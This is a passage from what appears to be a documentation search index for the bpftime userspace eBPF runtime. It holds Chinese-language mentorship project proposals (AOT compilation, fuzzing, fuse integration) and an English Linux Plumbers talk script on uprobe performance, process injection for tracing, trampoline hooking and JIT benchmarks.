\u7f16\u8bd1\u5668\u7684 POC\uff0c\u4f46\u662f\u4e0d\u5b8c\u6574\uff0c\u9700\u8981\u66f4\u591a\u7684\u5de5\u4f5c\u3002</li> </ol> <p>\u4f60\u53ef\u4ee5\u9009\u62e9\u4ee5\u4e0b\u76ee\u6807\u4e2d\u7684\u4e00\u4e2a\u6216\u4e24\u4e2a\u6765\u5de5\u4f5c\uff1a</p> <ol> <li>\u96c6\u6210\u5230 FaaS \u5bb9\u5668\u4e2d\uff1a\u628a\u8fd9\u9879\u6280\u672f\u65e0\u7f1d\u5730\u96c6\u6210\u5230 Function-as-a-Service\uff08FaaS\uff09\u8f7b\u91cf\u7ea7\u5bb9\u5668\u4e2d\uff0c\u589e\u5f3a\u542f\u52a8\u901f\u5ea6\u548c\u8fd0\u8425\u6548\u7387\u3002</li> <li>\u5b9e\u73b0\u63d2\u4ef6\u7cfb\u7edf\uff1a\u8bbe\u8ba1\u4e00\u4e2a\u7cfb\u7edf\uff0c\u5141\u8bb8 eBPF \u7a0b\u5e8f\u4f5c\u4e3a\u63d2\u4ef6\u5d4c\u5165\u5230\u5176\u5b83\u5e94\u7528\u4e2d\uff0c\u63d0\u4f9b\u52a8\u6001\u3001\u4f18\u5316\u7684\u529f\u80fd\u3002</li> <li>\u5728\u5d4c\u5165\u5f0f\u8bbe\u5907\u4e0a\u8fd0\u884c AOT ebpf\uff1a\u8ba9 AOT eBPF \u80fd\u5728\u5d4c\u5165\u5f0f\u8bbe\u5907\u4e0a\u8fd0\u884c\uff0c\u6bd4\u5982 Raspberry Pi \u548c\u5176\u4ed6 IoT \u8bbe\u5907\u3002</li> </ol>"},{"location":"others/miscellaneous/ideas/#_6","title":"\u5fc5\u8981\u7684\u6280\u80fd","text":"<ul> <li>C/C++ \u548c\u7cfb\u7edf\u5c42\u6b21\u7f16\u7a0b\u7684\u6280\u80fd\u3002</li> <li>\u57fa\u672c\u7406\u89e3\u5bb9\u5668\u6280\u672f\u548c FaaS \u67b6\u6784\u3002</li> <li>\u719f\u6089 eBPF \u7684\u6982\u5ff5\u548c\u5e94\u7528\u3002</li> <li>\u5bf9\u7269\u8054\u7f51\u3001\u4e91\u539f\u751f\u548c\u5d4c\u5165\u5f0f\u7cfb\u7edf\u6709\u5174\u8da3\u3002</li> </ul>"},{"location":"others/miscellaneous/ideas/#_7","title":"\u9884\u671f\u7684\u6210\u679c","text":"<ul> <li>\u5177\u6709 AOT \u7f16\u8bd1\u80fd\u529b\u7684\u51fd\u6570 eBPF \u8fd0\u884c\u65f6\u3002</li> <li>\u5728 FaaS \u8f7b\u91cf\u7ea7\u5bb9\u5668\u4e2d\u96c6\u6210\u7684\u5b9e\u8df5\u6f14\u793a\u3002</li> <li>\u4e00\u4e2a\u53ef\u4ee5\u8ba9 eBPF \u7a0b\u5e8f\u4f5c\u4e3a\u63d2\u4ef6\u5d4c\u5165\u5230\u5404\u79cd\u5e94\u7528\u7684\u63d2\u4ef6\u7cfb\u7edf\u3002</li> <li>\u5728\u5d4c\u5165\u5f0f\u8bbe\u5907\u4e0a\u8fd0\u884c\u7684 AOT eBPF\u3002</li> </ul>"},{"location":"others/miscellaneous/ideas/#_8","title":"\u989d\u5916\u7684\u8d44\u6e90","text":"<ol> <li>bpftime \u7684 AOT \u793a\u4f8b https://github.com/eunomia-bpf/bpftime/blob/master/.github/workflows/test-aot-cli.yml</li> <li>vm \u7684 API\u3002 https://github.com/eunomia-bpf/bpftime/tree/master/vm/include</li> <li>\u7f16\u8bd1\u5b83\u4f5c\u4e3a\u4e00\u4e2a\u72ec\u7acb\u7684\u5e93 https://github.com/eunomia-bpf/bpftime/tree/master/vm/llvm-jit</li> </ol> <p>\u5982\u679c\u4f60\u60f3\u4e3a\u5fae\u63a7\u5236\u5668\u589e\u52a0\u6620\u5c04\u652f\u6301\uff0c\u6211\u8ba4\u4e3a\u4f60\u53ef\u4ee5\u5199\u4e00\u4e2a c \u5b9e\u73b0\uff0c\u7f16\u8bd1\u5b83\u5e76\u94fe\u63a5\u5230 bpftime AOT \u4ea7\u54c1\u3002\u7a0d\u540e\u6211\u4eec\u4f1a\u63d0\u4f9b\u4e00\u4e2a\u4f8b\u5b50\u3002</p>"},{"location":"others/miscellaneous/ideas/#bpftime-fuzzer","title":"\u4e3a bpftime \u6dfb\u52a0 Fuzzer \u5e76\u6539\u8fdb\u517c\u5bb9\u6027","text":""},{"location":"others/miscellaneous/ideas/#_9","title":"\u9879\u76ee\u6982\u8ff0","text":"<p><code>bpftime</code> \u9879\u76ee\uff0c\u56e0\u5176\u521b\u65b0\u7684\u7528\u6237\u7a7a\u95f4 eBPF \u8fd0\u884c\u65f6\u800c\u77e5\u540d\uff0c\u6b63\u5728\u5bfb\u6c42\u901a\u8fc7\u6574\u5408 Fuzzer \u6765\u589e\u5f3a\u5176\u5065\u58ee\u6027\u548c\u53ef\u9760\u6027\u3002\u8be5\u9879\u76ee\u7684\u76ee\u6807\u662f\u4e3a <code>bpftime</code> \u5f00\u53d1\u5e76\u96c6\u6210\u4e00\u4e2a\u4e13\u7528\u7684 Fuzzer\uff0c\u4f7f\u7528\u50cf Google's Buzzer \u8fd9\u6837\u7684\u5de5\u5177\u3002Fuzzer \u5c06\u7cfb\u7edf\u5730\u6d4b\u8bd5 <code>bpftime</code>\uff0c\u4ee5\u63ed\u793a\u4efb\u4f55\u53ef\u80fd\u7684 bug\u3001\u5185\u5b58\u6cc4\u6f0f\u6216\u6f0f\u6d1e\uff0c\u4ece\u800c\u786e\u4fdd\u66f4\u5b89\u5168\u548c\u7a33\u5b9a\u7684\u8fd0\u884c\u65f6\u73af\u5883\u3002</p> <p>\u4f60\u8fd8\u9700\u8981\u5728 CI \u4e2d\u542f\u7528 Fuzzer\u3002</p>"},{"location":"others/miscellaneous/ideas/#_10","title":"\u65f6\u95f4\u548c\u96be\u5ea6","text":"<ul> <li>\u65f6\u95f4\u627f\u8bfa\uff1a~90\u5c0f\u65f6</li> <li>\u96be\u5ea6\u7ea7\u522b\uff1a\u5bb9\u6613</li> </ul>"},{"location":"others/miscellaneous/ideas/#_11","title":"\u5bfc\u5e08","text":"<ul> <li>Tong Yu (yt.xyxx@gmail.com)</li> <li>Yusheng Zheng (yunwei356@gmail.com)</li> </ul>"},{"location":"others/miscellaneous/ideas/#_12","title":"\u76ee\u6807","text":"<ol> <li>\u5f00\u53d1\u548c\u96c6\u6210 Fuzzer\uff1a\u8bbe\u8ba1\u548c\u5f00\u53d1\u4e00\u4e2a\u53ef\u4ee5\u65e0\u7f1d\u96c6\u6210\u5230 <code>bpftime</code> \u7684 Fuzzer\u3002\u6216\u8005\u4f60\u53ef\u4ee5\u4f7f\u7528\u73b0\u6709\u7684 eBPF Fuzzers\u3002</li> <li>\u6d4b\u8bd5\u548c\u8c03\u8bd5\uff1a\u4f7f\u7528 Fuzzer \u6765\u67e5\u627e\u5e76\u62a5\u544a\u5728 <code>bpftime</code> \u7528\u6237\u7a7a\u95f4 eBPF \u8fd0\u884c\u65f6\u4e2d\u7684 bug\u3001\u5185\u5b58\u6cc4\u6f0f\u6216\u6f0f\u6d1e\u3002</li> <li>\u6587\u6863\uff1a\u521b\u5efa\u4e00\u4e2a\u6587\u6863\uff0c\u89e3\u91ca Fuzzer \u5728 <code>bpftime</code> \u73af\u5883\u4e2d\u7684\u5b9e\u73b0\u548c\u4f7f\u7528\u3002</li> <li>\u5b9e\u65bd\u53cd\u9988\uff1a\u79ef\u6781\u5408\u5e76 <code>bpftime</code> \u793e\u533a\u7684\u53cd\u9988\uff0c\u4ee5\u6539\u8fdb\u548c\u52a0\u5f3a Fuzzer\u3002</li> </ol>"},{"location":"others/miscellaneous/ideas/#_13","title":"\u9884\u671f\u7684\u6210\u679c","text":"<ul> <li>\u5728 <code>bpftime</code> \u73af\u5883\u4e2d\u5b8c\u5168\u96c6\u6210\u7684 Fuzzer\u3002</li> <li><code>bpftime</code> \u4e2d\u4fa6\u6d4b\u548c\u89e3\u51b3\u7684 bug \u548c\u6f0f\u6d1e\u6570\u91cf\u7684\u589e\u52a0\u3002</li> <li>\u5bf9\u672a\u6765\u7684\u8d21\u732e\u8005\u4f7f\u7528\u548c\u6539\u8fdb Fuzzer \u7684\u6587\u6863\u548c\u6307\u5357</li> </ul>"},{"location":"others/miscellaneous/ideas/#_14","title":"\u8981\u6c42\u548c\u6280\u80fd","text":"<ul> <li>C/C++ \u548c\u7cfb\u7edf\u7f16\u7a0b\u7684\u6280\u80fd\u3002</li> <li>\u5bf9\u8f6f\u4ef6\u6d4b\u8bd5\u65b9\u6cd5\u7684\u4e86\u89e3\uff0c\u7279\u522b\u662f Fuzz \u6d4b\u8bd5\u3002</li> <li>\u6709\u4f7f\u7528 Google \u7684 Buzzer \u7b49 Fuzzer \u7684\u7ecf\u9a8c\u7684\u4eba\u5c06\u5927\u53d7\u6b22\u8fce\u3002</li> <li>\u5bf9 eBPF \u548c\u5b83\u7684\u751f\u6001\u7cfb\u7edf\u7684\u57fa\u672c\u4e86\u89e3\u3002</li> </ul>"},{"location":"others/miscellaneous/ideas/#_15","title":"\u53c2\u8003\u548c\u95ee\u9898","text":"<ul> <li>\u5728 <code>bpftime</code> \u4e2d\u9700\u8981 Fuzzer \u7684\u521d\u59cb\u8ba8\u8bba\uff1aGitHub Issue</li> <li>Google buzzer\uff1ahttps://github.com/google/buzzer</li> </ul>"},{"location":"others/miscellaneous/ideas/#bpftime-fuse-ebpf","title":"bpftime + fuse\uff1a\u7528\u6237\u7a7a\u95f4\u7684 eBPF \u652f\u6301\u7528\u6237\u7a7a\u95f4\u7684\u6587\u4ef6\u7cfb\u7edf","text":"<p>\u5728\u73b0\u4ee3\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c<code>fuse</code> \uff08\u7528\u6237\u7a7a\u95f4\u7684\u6587\u4ef6\u7cfb\u7edf\uff09\u5df2\u6210\u4e3a\u6d41\u884c\u7684\u9009\u62e9\uff0c\u4f7f\u5f97\u5f00\u53d1\u8005\u4e0d\u4fee\u6539\u5185\u6838\u4ee3\u7801\u5c31\u53ef\u4ee5\u5728\u7528\u6237\u7a7a\u95f4\u4e2d\u521b\u5efa\u6587\u4ef6\u7cfb\u7edf\u3002\u7136\u800c\uff0c\u7cfb\u7edf\u8c03\u7528\u7684\u4ee3\u4ef7\u4ecd\u7136\u5b58\u5728\u3002\u8fd9\u5c31\u662f <code>bpftime</code> \u53ef\u4ee5\u53d1\u6325\u4f5c\u7528\u7684\u5730\u65b9\u3002</p> <p>bpftime \u53ef\u80fd\u6709\u52a9\u4e8e\uff1a</p> <ul> <li>\u51cf\u5c11\u7cfb\u7edf\u8c03\u7528\u7684\u5f00\u9500\uff0c\u63d0\u9ad8\u6027\u80fd</li> <li>\u5728\u4e0d\u4fee\u6539\u5185\u6838\u7684\u60c5\u51b5\u4e0b\u4e3a fuse \u542f\u7528\u7f13\u5b58</li> <li>\u6839\u636e\u6027\u80fd\u6570\u636e\u52a8\u6001\u8c03\u6574\u6587\u4ef6\u7cfb\u7edf\u7b56\u7565</li> <li>\u4e3a fuse \u6dfb\u52a0\u66f4\u591a\u7684\u7b56\u7565\u548c\u7b56\u7565</li> </ul> <p>\u4f60\u53ef\u4ee5\u548c\u6211\u4eec\u4e00\u8d77\u63a2\u7d22\u66f4\u591a\u7684\u53ef\u80fd\u6027\uff1a</p> <ul> <li>\u65f6\u95f4\uff1a~350 \u5c0f\u65f6</li> <li>\u96be\u5ea6\u7b49\u7ea7\uff1a\u56f0\u96be</li> <li>\u5bfc\u5e08\uff1aYiwei Yang (yyang363@ucsc.edu) Yusheng Zheng (yunwei356@gmail.com)</li> </ul>"},{"location":"others/miscellaneous/ideas/#_16","title":"\u76ee\u6807","text":"<ol> <li>\u7528\u6237\u7a7a\u95f4\u548c\u5185\u6838\u7a7a\u95f4\u4e4b\u95f4\u7684\u534f\u540c\u4f18\u5316\uff1a\u5229\u7528 <code>bpftime</code> \u5728\u7528\u6237\u7a7a\u95f4\u4e2d\u9884\u5904\u7406\u6587\u4ef6\u7cfb\u7edf\u64cd\u4f5c\uff0c\u5982\u7f13\u5b58\u548c\u5143\u6570\u636e\u67e5\u8be2\uff0c\u4ece\u800c\u6700\u5c0f\u5316\u7cfb\u7edf\u8c03\u7528\u7684\u5f00\u9500\u3002</li> <li>\u7528\u6237\u7a7a\u95f4\u7684\u5185\u6838\u7ed5\u8fc7\u673a\u5236\uff1a\u4f7f\u7528 eBPF \u5728\u7528\u6237\u7a7a\u95f4\u5f00\u53d1\u4e00\u4e2a\u6587\u4ef6\u7cfb\u7edf\u7684\u5185\u6838\u7ed5\u8fc7\u673a\u5236\uff0c\u53ef\u80fd\u6d88\u9664\u4e86\u5bf9\u7528\u6237\u5e94\u7528\u8fdb\u884c\u4fb5\u5165\u6027\u66f4\u6539\u7684\u9700\u8981\u3002</li> <li>\u52a8\u6001\u7b56\u7565\u8c03\u6574\uff1a\u5728 <code>bpftime</code> \u4e2d\u5b9e\u65bd\u4e00\u4e2a\u7cfb\u7edf\uff0c\u52a8\u6001\u5730\u6536\u96c6\u6027\u80fd\u6570\u636e\u5e76\u5b9e\u65f6\u8c03\u6574\u64cd\u4f5c\u7b56\u7565\u3002</li> <li>\u4e3a\u7279\u5b9a\u5de5\u4f5c\u8d1f\u8f7d\u7684\u5b9a\u5236\uff1a\u4f7f\u5f00\u53d1\u8005\u80fd\u591f\u4e3a\u591a\u79cd\u5e94\u7528\u573a\u666f\u91cf\u8eab\u5b9a\u5236 eBPF \u7a0b\u5e8f\uff0c\u4ee5\u4f18\u5316\u5404\u79cd\u5de5\u4f5c\u8d1f\u8f7d\u3002</li> </ol>"},{"location":"others/miscellaneous/ideas/#_17","title":"\u9884\u671f\u7684\u6210\u679c","text":"<ul> <li>\u5c55\u793a <code>bpftime</code> \u548c\u7528\u6237\u7a7a\u95f4\u6587\u4ef6\u7cfb\u7edf\u534f\u540c\u7684\u6982\u5ff5\u9a8c\u8bc1\u5b9e\u73b0\u3002</li> <li>\u51cf\u5c11\u5728\u7528\u6237\u7a7a\u95f4\u8fdb\u884c\u6587\u4ef6\u64cd\u4f5c\u7684\u7cfb\u7edf\u8c03\u7528\u5f00\u9500\u3002</li> <li>\u4e00\u4e2a\u53ef\u4ee5\u6839\u636e\u6027\u80fd\u6570\u636e\u52a8\u6001\u8c03\u6574\u6587\u4ef6\u7cfb\u7edf\u7b56\u7565\u7684\u6846\u67b6\u3002</li> <li>\u6587\u6863\u6216\u8bba\u6587</li> </ul>"},{"location":"others/miscellaneous/ideas/#_18","title":"\u5fc5\u8981\u7684\u6280\u80fd","text":"<ul> <li>\u7cbe\u901a C/C++ \u548c\u7cfb\u7edf\u7ea7\u7f16\u7a0b\u3002</li> <li>\u719f\u6089\u6587\u4ef6\u7cfb\u7edf\u7684\u6982\u5ff5\u4ee5\u53ca\u7528\u6237\u7a7a\u95f4-\u5185\u6838\u7a7a\u95f4\u7684\u4ea4\u4e92\u3002</li> <li>\u57fa\u7840\u7406\u89e3 eBPF \u53ca\u5176\u5728\u73b0\u4ee3\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u7684\u5e94\u7528\u3002</li> <li>\u5bf9 <code>fuse</code> \u6216\u7c7b\u4f3c\u6280\u672f\u6709\u7ecf\u9a8c\u8005\u4f18\u5148\u3002</li> </ul>"},{"location":"others/miscellaneous/ideas/#_19","title":"\u8d44\u6e90","text":"<ul> <li>Extfuse \u8bba\u6587\u548c GitHub \u4ed3\u5e93: https://github.com/extfuse/extfuse</li> <li>https://lwn.net/Articles/915717/</li> </ul> <p>Share on  Share on </p>"},{"location":"others/miscellaneous/linux-plumbers-talk/","title":"bpftime talk at linux plumbers 2025","text":""},{"location":"others/miscellaneous/linux-plumbers-talk/#title-slide-introducing-bpftime-a-new-frontier-in-userspace-ebpf-runtime-30s","title":"Title Slide: Introducing bpftime - A New Frontier in Userspace eBPF Runtime \uff0830s\uff09","text":"<p>Hello everyone, and thank you for joining me today. I'm excited to talk about our latest project - bpftime, a innovative new userspace eBPF runtime.</p> <p>My name is Yusheng Zheng, currently maintaining a small community called eunomia-bpf, building open source projects related to eBPF. In fact, this is the first time I've spoken at linux plumbers, so I'm very excited to be here.</p>"},{"location":"others/miscellaneous/linux-plumbers-talk/#agenda-1m","title":"Agenda (1m)","text":"<p>This is the topic we are going to discuss about today. I will start with a brief introduction to Why a new userspace eBPF runtime, there may be kernel Uprobe performance issues, kernel eBPF security concerns and limited configurable, other userspace eBPF runtime limitations, and some existing Non-kernel eBPF Usecases.</p> <p>After that, I will introduce bpftime, how it works, the benchmarks and examples, and how we can run existing eBPF tools and projects on it.</p> <p>Finally, I will talk about some open problems and our future plans.</p>"},{"location":"others/miscellaneous/linux-plumbers-talk/#why-bpftime-uprobe-2m","title":"Why bpftime: uprobe (2m)","text":"<p>Let's start with why we felt the need to create a new userspace eBPF runtime. eBPF has change the way we approach observability, networking, and security in Linux environments.</p> <p>However, its integration at the kernel level has not been without challenges.</p> <p>Uprobe is short for User-level dynamic tracing, it can attach to a user-level function and run a BPF program when the function is executed. It is widely used in production, such as tracing user-space protocols: SSL, TLS, HTTP2, monitoring memory allocation and detecting leaks, tracking bash scripts, and more.</p> <p>However, We've seen performance issues with Kernel Uprobe, where current implementations require two kernel context copies, leading to significant overhead. You can see that uprobe have a ten times overhead compared to the kernel kprobe.</p> <p>Also, kernel Syscall tracepoints will hook all syscalls and require filter for specific process, which is not very flexible.</p>"},{"location":"others/miscellaneous/linux-plumbers-talk/#why-bpftime-security-and-flexibility-2m","title":"Why bpftime: security and flexibility (2m)","text":"<p>Let's move on to the security implications of kernel eBPF. Running eBPF in the kernel demands root access, and this, naturally, enlarges the attack surface.</p> <p>Now, let's glance at this chart [refer to Figure 1]. It shows a tally of eBPF-related security vulnerabilities, known as CVEs, from the past decade. Notice how the verifier, which is supposed to be the gatekeeper ensuring only safe eBPF programs run, is actually where most CVEs were found. It's a sobering reminder that complexity can breed security gaps.</p> <p>And when we talk about configurability, there's a sticking point. The verifier restricts eBPF operations quite a bit. To make eBPF fully Turing-complete, which means allowing it to perform any computation given enough resources, requires changing the kernel. And adding new helpers or features? You guessed it - that needs a kernel change too.</p> <p>What this all boils down to is a need for a runtime that can offer the power of eBPF without these constraints, and that's where bpftime steps in.</p>"},{"location":"others/miscellaneous/linux-plumbers-talk/#slide-6-current-userspace-ebpf-runtime-limitations","title":"[Slide 6: Current Userspace eBPF Runtime Limitations]","text":"<p>\"Let's dive into the third reason for bpftime's inception: the limitations of current userspace eBPF runtimes. Userspace eBPF has some fantastic potential applications like observability within user programs, managing network operations, and handling configurations and plugins. But there's a catch.</p> <p>The eBPF we have today in userspace can't quite keep up with all the workloads we want it to.</p> <p>For instance, take Ubpft and Rbpft, both existing userspace eBPF solutions available on GitHub. They've got some neat features like ELF parsing and just-in-time compilation for specific architectures. But they fall short in some areas \u2013 they're tough to integrate with, can't use the kernel's eBPF loader or toolchains like libbpf/clang, and they lack certain types of attach support. Plus, they don't support interprocess communication or kernel maps, and they're limited to just a couple of architectures for JIT compilation.</p> <p>So, in essence, while existing userspace eBPF frameworks lay down a solid foundation, they don't quite offer the broad functionality and ease of use that we're aiming for with bpftime.\"</p>"},{"location":"others/miscellaneous/linux-plumbers-talk/#slide-7-existing-non-kernel-ebpf-usecases","title":"[Slide 7: Existing Non-kernel eBPF Usecases]","text":"<p>\"Now, let's look at the innovative ways eBPF is being used outside the kernel. We're not just talking about small tweaks here and there; we're talking about some real game-changing applications.</p> <p>First up, we've got Qemu+uBPF, which is like giving Qemu a superpower to understand eBP.</p> <p>Then there's Oko, which gives Open vSwitch-DPDK a serious boost with BPF capabilities..</p> <p>We also have Solana, which is taking smart contracts to the next level with userspace eBPF. </p> <p>For the network folks, DPDK eBPF is where it's at for fast packet processing.</p> <p>And let's not overlook eBPF for Windows. Yes, Windows! Bringing eBPF toolchains and runtime over to the Windows kernel is no small feat, and it's opening doors for a whole new set of developers.</p> <p>Diving into research, we see papers like Rapidpatch, which is all about quick fixes for firmware in real-time systems, and Femto-Containers, which are all about making tiny, efficient virtual spaces for IoT devices.</p> <p>Put it all together, and you've got networks, plugins, edge computing, smart contracts, quick patches, and even Windows environments all benefiting from the power of eBPF. This landscape shows us just how versatile and impactful eBPF technology can be.\"</p>"},{"location":"others/miscellaneous/linux-plumbers-talk/#slide-8-bpftime-userspace-ebpf-runtime","title":"[Slide 8: Bpftime - Userspace eBPF Runtime]","text":"<p>\"Now, let's talk about bpftime itself \u2014 our userspace eBPF runtime that's all about speed and functionality.</p> <p>Here's the deal: with bpftime, Uprobes. Our userspace uprobe can be spped up to 10 times faster than the traditional kernel uprobe. And just like kernel uprobe, you don't need any manual instrumentation or restart processes.</p> <p>We're not just fast; bpftime is compatible with kernel eBPF toolchains and libraries, so there's no need to rewrite your eBPF apps.</p> <p>Then there's the versatility. Bpftime supports interprocess and kernel maps, allowing it to work in harmony with kernel eBPF. Plus, we've got this cool feature called 'offload to userspace,' which means you can run your checks with the kernel verifier, and then the actual execution happens in userspace.</p> <p>And for the tech-savvy, we've introduced a new LLVM JIT compiler for eBPF. This is for those who crave that cutting-edge performance.</p> <p>So, to sum it up: bpftime brings you the speed, compatibility, and advanced features to make your eBPF experience in userspace better.</p>"},{"location":"others/miscellaneous/linux-plumbers-talk/#slide-9-current-support-features-of-bpftime","title":"[Slide 9: Current Support Features of bpftime]","text":"<p>\"Let's get into the specifics of what bpftime currently supports:</p> <p>On the table for bpftime's features, we've got a variety of shared memory map types that are key to userspace eBPF. We're talking about the classics here: HASH, ARRAY, RINGBUF, PERF_EVENT_ARRAY, and PERCPU varieties. These are your building blocks for creating shared data structures that are crucial for eBPF programs to communicate efficiently and store data.</p> <p>Now, for the bridge between user space and kernel space, we've got shared maps too. This means that whether you're working above or below the kernel line, you can expect seamless integration and data flow. It's like having a bilingual friend who can translate on the fly in a conversation.</p> <p>Moving on to probe types, which are essentially the hooks you can attach to in userspace. We cover the whole gamut from syscall tracepoints to uprobes and uretprobes. These allow you to monitor and interact with system calls or user-level functions \u2013 a bit like having a spyglass into the inner workings of your programs.</p> <p>But there's more \u2013 bpftime is flexible. You're not limited to what we provide out of the box; you can define other static tracepoints and program types in userspace to suit your needs.</p> <p>And for those who like the technicalities, we support 22 kernel helper functions and ensure compatibility with both kernel and userspace verifiers. </p> <p>We've even put our JIT through the wringer with bpf_conformance tests to make sure it's up to snuff.</p>"},{"location":"others/miscellaneous/linux-plumbers-talk/#slide-10-uprobe-and-kprobe-mix-2-modes","title":"[Slide 10: Uprobe and Kprobe Mix: 2 Modes]","text":"<p>\"Alright, let's break down the two modes of operation that bpftime offers for running eBPF in userspace.</p> <p>Mode 1 is what I like to call the 'lone ranger' mode. It's all about running eBPF solely in userspace. This means you can use it even on systems that aren't running Linux \u2014 pretty cool, right? </p> <p>However, it's not the go-to for the heavyweight eBPF applications because the maps created in shared memory can't be utilized by kernel eBPF programs.</p> <p>Then we have Mode 2, which is like a tag team. Here, bpftime works in tandem with kernel eBPF, courtesy of the bpftime-daemon. It mimics the behavior of kernel uprobes, which means it's pretty savvy at attaching to processes, whether they're just starting or already running. You get the full ensemble here: uprobes, kprobes, and even socket support.</p> <p>Think of Mode 2 like a fusion restaurant \u2014 you get the best of both worlds. You don't need to modify the kernel; instead, bpftime uses the eBPF module to keep an eye on or tweak the behavior of BPF syscalls.</p> <p>In a nutshell, whether you're operating solo in userspace or partnering with the kernel, bpftime has got you covered.\"</p>"},{"location":"others/miscellaneous/linux-plumbers-talk/#slide-11-examples-monitoring-memory-allocation-with-bpftime","title":"[Slide 11: Examples - Monitoring Memory Allocation with bpftime]","text":"<p>\"Let's move into the practical world and see bpftime in action with a real-life example. Say you want to keep an eye on memory allocation by monitoring the 'malloc' function in libc \u2013 that's a function in C that grabs a chunk of memory for you to use.</p> <p>Here's how simple it is: First, you compile and load your eBPF program with bpftime's command line interface. Just a couple of commands and you're set.</p> <p>Now, if you want to trace a program from the start, you run it with bpftime, and it'll print out messages every time 'malloc' is called, showing you the process ID. It's like having a tracking device on 'malloc' \u2013 you know exactly when and where it's being called.</p> <p>But what if your program is already up and running, and you decide you want to start monitoring? No problem. You can dynamically attach bpftime to the running process. Just find out the process ID, and with a single command, bpftime jumps into action, no restart needed. It's like deciding to stream your favorite show and instantly getting the feed \u2013 smooth and hassle-free.</p> <p>And there you have it, right on your screen, the output from your original program, showing how many times 'malloc' was called. It's that easy to get insights into your program's behavior with bpftime.</p>"},{"location":"others/miscellaneous/linux-plumbers-talk/#slide-12-examples-detailed-monitoring-with-bpftime","title":"[Slide 12: Examples - Detailed Monitoring with bpftime]","text":"<p>\"Continuing with our hands-on examples, let's walk through the steps to get our bpftime daemon up and tracing those 'malloc' calls in libc.</p> <p>First things first, kick off the bpftime daemon with a simple sudo command. This starts the behind-the-scenes magic that makes monitoring possible, setting up the shared memory space that bpftime will use.</p> <p>Now, run the 'malloc' example. A few more commands in your terminal, and you'll load the eBPF object from the buffer. It's like loading a game cartridge into a console; you're just moments away from action.</p> <p>The next part is where things get really interesting. You can trace 'malloc' calls in your target process. Fire up the example victim program, and with the help of bpftime, you'll see real-time output every time 'malloc' is called, along with the process ID. It's like having a live feed of what's happening under the hood of your application.</p> <p>And there it is, right in another console window, you'll see the tally of 'malloc' calls for the target process. It's a straightforward way to get actionable insights into how your application is behaving, memory-wise.</p> <p>In essence, with bpftime, monitoring crucial functions like 'malloc' becomes as easy as following a recipe. You're in control, with all the data you need at your fingertips.\"</p>"},{"location":"others/miscellaneous/linux-plumbers-talk/#slice-13-15","title":"[slice 13-15]","text":"<p>As we delve further into bpftime's capabilities, let's focus on Mode 1, where eBPF runs entirely in userspace. This mode allows for a seamless experience when using tools like bcc and bpftrace, requiring no modifications to the tools themselves. It's like having an app on your phone that works perfectly without needing any updates.</p> <p>Now, let's bridge the gap between this userspace operation and how bpftime contrasts with the kernel eBPF. Typically, eBPF toolchains like clang, bpf tool, and bpftrace are used to develop eBPF programs that run in the kernel space, requiring a series of steps including loading, verification, and JIT compilation, which ensures that the program is safe and efficient to run.</p> <p>With bpftime, these eBPF programs live and run in userspace, bypassing the kernel. </p> <p>They are loaded and managed by a userspace library, leveraging a syscall interface provided by bpftime, which still goes through a verification process. </p> <p>The difference here is the final execution location. Instead of running within the kernel, bpftime allows these programs to execute in userspace, interacting with target processes through uprobes or tracepoints. This provides a layer of isolation and security, as it limits the potential impact of the eBPF program to the userspace environment only.</p> <p>The visualization we see in these slides [referring to slides 14 and 15] clarifies the journey an eBPF program takes when run in userspace via bpftime.</p> <p>It moves from source code through the toolchain, and then within the userspace, it's managed by bpftime components, which handle the verification and JIT compilation. Ultimately, the program can observe and interact with target processes, all within the safety and confines of userspace.</p> <p>This contrast highlights bpftime's unique approach, offering the power and versatility of eBPF with the added benefits of userspace execution, such as increased safety and flexibility. </p> <p>By running in userspace, bpftime opens the door for eBPF's use in environments where modifying the kernel is not possible or desirable.</p>"},{"location":"others/miscellaneous/linux-plumbers-talk/#how-it-works-injection","title":"How it works: injection","text":"<p>\"Moving on, let's talk about how bpftime takes the concept of eBPF and applies it in a practical, user-friendly manner through the process of injection. Injection here simply means how we insert, or 'inject', the bpftime capabilities into the programs we want to monitor or manipulate.</p> <p>bpftime simplifies this process by supporting two types of injection, tailored to the state of your application. If you've got a running process and you decide you want to start monitoring it with eBPF, bpftime uses the Ptrace method, which is based on the powerful Frida instrumentation toolkit.</p> <p>For those situations where you're just about to start a new process, bpftime uses the LD_PRELOAD method. This is like giving your application a pair of glasses before it starts reading \u2014 it enhances the process from the get-go.</p>"},{"location":"others/miscellaneous/linux-plumbers-talk/#how-it-works-trampoline","title":"How it Works: trampoline","text":"<p>\"Now, let's get into the how bpftime actually gets the job done with trampoline hooking.</p> <p>Here's how it looks in practice. For functions running in userspace, bpftime uses something called frida-gum. This is a toolkit that helps us to neatly insert our own code into the function we're interested in. It's like being able to add an extra step in a dance without missing a beat.</p> <p>For system calls, which are the ways a program requests a service from the kernel, we use two methods: zpoline and pmem/syscall_intercept. These are different techniques for hooking into system calls efficiently.</p> <p>The beauty of this approach is that it's not rigid; we can add new trampoline methods as needed. This means bpftime is adaptable and can evolve as new requirements or better methods are discovered.</p> <p>The graphics here [referring to the slide] give you a clear visualization of how the trampoline code is inserted into the process's flow. </p> <p>You can see that we're not disrupting the original program; we're just adding our own layer that allows us to observe or modify behavior before passing control back to the program.</p>"},{"location":"others/miscellaneous/linux-plumbers-talk/#how-it-works-work-with-kernel","title":"How it Works: work with kernel","text":"<p>In Mode 2, bpftime showcases its versatility by blending userspace eBPF with kernel operations. This is where things get robust, allowing you to run complex observability tools like deepflow, which require a mix of userspace agility and kernel-level depth.</p> <p>Picture this: bpftime in Mode 2 uses userspace eBPF for quick and safe execution while still interacting transparently with kernel eBPF. It's like having a pass to both VIP and backstage areas at a concert; you get the best of both worlds without compromise.</p> <p>How does it do this? By using kernel eBPF maps, bpftime can 'offload' certain tasks to userspace, allowing for efficient processing without overloading the kernel. It's akin to cloud computing, where heavy tasks are offloaded to the cloud, keeping your local resources free.</p> <p>The workflow [refer to slide 19] is intuitive. bpftime's daemon loads the eBPF program, which then hooks into the system calls or functions you're interested in, all verified and JIT-compiled. </p>"},{"location":"others/miscellaneous/linux-plumbers-talk/#benchmark-llvm-jit","title":"benchmark llvm jit","text":"<p>Let's shift gears and look at another critical aspect of bpftime's performance: the JIT, or Just-In-Time compilation benchmarking. JIT is like the sprinter of the programming world\u2014it translates eBPF bytecode to native machine code on the fly, aiming for maximum performance.</p> <p>Now, the execution time graph here [referring to slide 21] shows us a lineup from various JIT implementations, including ubpf, rbpf, and LLVM's jit/aot, to wasm and native 